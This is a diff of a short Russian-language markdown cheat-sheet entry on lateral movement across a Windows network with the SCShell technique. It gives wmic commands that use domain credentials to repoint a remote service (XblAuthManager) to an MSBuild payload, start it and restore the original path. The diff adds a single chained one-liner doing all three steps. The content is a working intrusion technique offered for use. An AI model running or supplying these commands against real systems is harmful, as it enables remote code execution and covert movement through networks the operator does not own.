@@ -1,5 +1,7 @@
-## Двигаемся боком
+## Двигаемся боком 
 
+*расширяемся по (нашей наверное) сети !
+ 
 для этого есть прeкрасный [инструмент](https://github.com/SpiderLabs/SCShell)
 
 Шаг 1: Получите текущее pathName вашей целевой службы, чтобы мы могли восстановить его после запуска нашей команды (в нашем случае XblAuthManager)
@@ -17,3 +19,7 @@
 Шаг 4. Измените путь службы до ее первоначального значения.
 
 `wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs"`
+
+И дабы все обьеденить в одну команду.
+
+`wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe C:\testPayload.xml" & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call startservice & wmic /user:DOMAIN\USERNAME /password:PASSWORD /node:TARGET_IP service where name='XblAuthManager' call change PathName="C:\Windows\system32\svchost.exe -k netsvcs" `
